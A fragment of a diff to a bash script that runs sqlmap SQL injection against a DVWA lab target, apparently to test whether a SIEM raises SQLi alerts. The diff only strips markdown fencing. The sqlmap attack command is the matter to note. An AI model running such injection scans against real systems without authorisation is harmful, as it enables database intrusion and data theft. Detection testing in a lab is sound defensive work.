@@ -1,6 +1,4 @@
 
-##  attack-scripts/sqli_test.sh
-```bash
 #!/bin/bash
 # SQL Injection Simulation using sqlmap
 # Usage: ./sqli_test.sh <target-ip> <cookie>
@@ -23,5 +21,6 @@ sqlmap -u "http://$TARGET/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" \
   --risk=2
 
 echo "[+] Done. Check SIEM for SQLi alerts."
-```
+
+
 
